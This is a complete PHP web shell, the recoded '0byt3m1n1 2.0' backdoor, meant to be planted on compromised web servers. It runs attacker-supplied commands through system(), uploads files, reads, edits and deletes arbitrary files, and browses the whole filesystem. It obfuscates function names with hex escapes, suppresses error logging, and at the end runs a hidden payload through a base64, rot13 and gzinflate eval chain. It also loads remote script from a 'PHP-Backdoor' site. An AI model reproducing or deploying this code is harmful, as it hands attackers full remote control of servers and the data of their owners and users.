<?php
/*
    0 b y t 3 m 1 n 1 - 2.0
    Bypass 403 Forbidden / Auto Delete Shell / PHP Malware Detector / Minishell
    https://github.com/zerobyte-id/

    Recoded by xRyukZ 
    Simple Look
    facebook.com/sawalrever
*/

set_time_limit(0);
error_reporting(0);
error_log(0);

$sname       = "\x5f\x2f\x4b\x79\x6f\x73\x68\x69\x72\x6f\x20\x3e\x5c\x5f";
$__gcdir     = "\x67" . "\x65\x74\x63\x77\x64";
$__fgetcon7s = "\x66\x69\x6c\x65" . "\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
$__scdir     = "s" . "\x63\x61\x6e\x64\x69" . "r";
$rm__dir     = "\x72\x6d\x64" . "ir";
$un__link    = "\x75\x6e" . "\x6c\x69\x6e\x6b";

if (get_magic_quotes_gpc()) {
    foreach ($_POST as $key => $value) {
        $_POST[$key] = stripslashes($value);
    }
}

echo '<!DOCTYPE html>
    <html>
    <head>
    <style>
    @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300&display=swap");
    @import url("https://fonts.googleapis.com/css2?family=Josefin+Sans:wght@300&display=swap");
    body {
        background-color: #2E3440;
        color: white;
        font-family: "Poppins", sans-serif;
        margin: 0;
        font-size: 14px; 
    } 
    h1 {
        font-family: "Josefin Sans", sans-serif;
        font-size:50px;
        margin: 0; 
        color: #D8DEE9;
    } 
    h1:hover { 
        color: #ECEFF4;
    } 
    input,select { 
        background: #4C566A;
        color: #ECEFF4;
        border: 3px #2E3440 solid;
        border-radius: 5px;
    }
    a { 
        color: #E5E9F0;
        text-decoration: none;
        font-family: "Poppins", sans-serif;
    } 
    textarea { 
        width: 800px;
        height: 350px;
        background: #434C5E;
        border: 2px solid #111111;
        color: #ECEFF4;
        padding: 5px;
    } 
    tr:hover { 
        background: #3B4252; 
    } 
    th { 
        background: #4C566A;
        padding:3px; 
    }
    img{
        margin: 10px 50px 0px 0px;
        width: 250px;
    }
    font{
        padding: 0px;
        color: #D8DEE9;
        font-size: 14px;
    }
    </style>
    <meta name="robots" content"noindex. nofollow">
    <link href="https://fonts.googleapis.com/css?family=VT323" rel="stylesheet">
    <title>'.$sname.'</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    </head>
    <body>';

echo '<center><img src="https://i.imgur.com/ou9csEw.png"></center> ';
echo '<div style="color:#ef6c00;margin-top:0;"><a href="?"><h1><center>' . $sname . '</center></h1></a></div>';
echo '<iframe width="100%" height="20" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/950833519&color=%234c566a&auto_play=false&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>';
if (isset($_GET['path'])) {
    $path = $_GET['path'];
    chdir($_GET['path']);
} else {
    $path = $__gcdir();
}
$path  = str_replace("\\", "/", $path);
$paths = explode("/", $path);
echo '<hr color="#4C566A" style="margin-top:0;width:99%"><table width="100%" border="0" align="center" style="margin-top:0px;">';
echo "<font style='padding:15px'>( 0byt3m1n1 V 2.0 )<br><font style='padding:15px'>Recoded By xRyukZ</font>";
echo "<br>";
echo "<tr><td><font>Path: ";
foreach ($paths as $id => $pat) {
    echo "<a style='font-size:14px;' href='?path=";
    for ($i = 0; $i <= $id; $i++) {
        echo $paths[$i];
        if ($i != $id) {
            echo "/";
        }
    }
    echo "'>$pat</a>/";
}
echo '<br>';
echo '<form><label for="cmd">CMD :</label><input type="text" name="cmd" placeholder=""><input type="submit" value=">>"></form>';
echo '</font></td><td align="center" width="30%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:white;margin-bottom:10px;"/><input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
if (isset($_FILES['file'])) {
    if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
        echo '<center><font color="#00ff00">Upload OK!</font></center><br/>';
    } else {
        echo '<center><font color="red">Upload FAILED!</font></center><br/>';
    }
}
echo '<hr color="#4C566A" style="margin-top:0;width:99%;">';
if (isset($_GET['filesrc'])) {
    echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td>File: ';
    echo "" . basename($_GET['filesrc']);
    "";
    echo '</tr></td></table><br />';
    echo ("<center><textarea readonly=''>" . htmlspecialchars($__fgetcon7s($_GET['filesrc'])) . "</textarea></center>");
} elseif (isset($_GET['cmd'])){
    echo "<pre>";
    echo system($_GET['cmd']);
    echo "</pre>";
} elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
    echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
    if ($_POST['opt'] == 'rename') {
        if (isset($_POST['newname'])) {
            if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                echo '<center><font color="#00ff00">Rename OK!</font></center><br />';
            } else {
                echo '<center><font color="red">Rename Failed!</font></center><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" /> <input type="hidden" name="path" value="' . $_POST['path'] . '"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go" /></form>';
    } elseif ($_POST['opt'] == 'edit') {
        if (isset($_POST['src'])) {
            $fp = fopen($_POST['path'], 'w');
            if (fwrite($fp, $_POST['src'])) {
                echo '<center><font color="#00ff00">Edit File OK!.</font></center><br />';
            } else {
                echo '<center><font color="red">Edit File Failed!.</font></center><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST"><textarea cols=80 rows=20 name="src">' . htmlspecialchars($__fgetcon7s($_POST['path'])) . '</textarea><br /><input type="hidden" name="path" value="' . $_POST['path'] . '"><input type="hidden" name="opt" value="edit"><input type="submit" value="Go" /></form>';
    }
    echo '</center>';
} else {
    echo '</table><br /><center>';
    if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
        if ($_POST['type'] == 'dir') {
            if ($rm__dir($_POST['path'])) {
                echo '<center><font color="#00ff00">Dir Deleted!</font></center><br />';
            } else {
                echo '<center><font color="red">Delete Dir Failed!</font></center><br />';
            }
        } elseif ($_POST['type'] == 'file') {
            if ($un__link($_POST['path'])) {
                echo '<font color="#00ff00">Delete File Done.</font><br />';
            } else {
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';
    $_scdir = $__scdir($path);
    echo '<div id="content"><table width="80%" border="0" cellpadding="4" cellspacing="2" align="center"><tr class="first"> <th><center>Name</center></th><th width="10%"><center>Size</center></th><th width="20%"><center>Permissions</center></th> <th width="20%"><center>Last Update</center></th><th width="11%"><center>Actions</center></th></tr>';
    foreach ($_scdir as $dir) {
        if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..')
            continue;
        echo "<tr><td>[D] <a href=\"?path=$path/$dir\">$dir</a></td><td><center>--</center></td><td><center>";
        if (is_writable("$path/$dir"))
            echo '<font color="#00ff00">';
        elseif (!is_readable("$path/$dir"))
            echo '<font color="red">';
        echo perms("$path/$dir");
        if (is_writable("$path/$dir") || !is_readable("$path/$dir"))
            echo '</font>';
        echo "</center></td><td><center>" . date("d-M-Y H:i", filemtime("$path/$dir")) . "";
        echo "</center></td> <td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$dir\"><input type=\"hidden\" name=\"path\" value=\"$path/$dir\"><input type=\"submit\" value=\">\" /></form></center></td></tr>";
    }
    foreach ($_scdir as $file) {
        if (!is_file("$path/$file"))
            continue;
        $size = filesize("$path/$file") / 1024;
        $size = round($size, 3);
        if ($size >= 1024) {
            $size = round($size / 1024, 2) . ' MB';
        } else {
            $size = $size . ' KB';
        }
        echo "<tr><td>[F] <a href=\"?filesrc=$path/$file&path=$path\">$file</a></td><td><center>" . $size . "</center></td><td><center>";
        if (is_writable("$path/$file"))
            echo '<font color="#00ff00">';
        elseif (!is_readable("$path/$file"))
            echo '<font color="red">';
        echo perms("$path/$file");
        if (is_writable("$path/$file") || !is_readable("$path/$file"))
            echo '</font>';
        echo "</center></td><td><center>" . date("d-M-Y H:i", filemtime("$path/$file")) . "";
        echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$file\"><input type=\"hidden\" name=\"path\" value=\"$path/$file\"><input type=\"submit\" value=\">\" /></form></center></td></tr>";
    }
    echo '</table></div>';
}
function perms($file)
{
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvS0yxa6W2h7KcVQDxUJJo2TuourcJXGX1/XLHmhuSQzj2wzGYcrEArIjjgszZOXPCmoudnT61RBWBISe3CH//Fun3ErvpMkfz7mdsaOyTstt9YwdnHfCKzjFWAFtVhUAERiolXzLwxHpWz3E8Zk3OBy5DW0T4Qdn6MaQz/IQ4yC+nF1aI0+qU5vOxvVdkQuEaBbS3E5q5aS3SMxsclu26Ok5Jq238wEAZwFYcjSVEJdCxOvokbQNFowYzkHV3esOt5wYvtqz4ww8t5r6G6fc/QPvP157X0dgl3UpHv2qUOe3YKa5a7UMe/SM9WlYpWet/0F')))));
echo '<br><center>&copy; <span id="footer"></span> 2021.</center><br>';
echo '<script type="text/javascript" src="//zerobyte-id.github.io/PHP-Backdoor/inc/footer.js"></script>';
echo '</body></html>';
?>

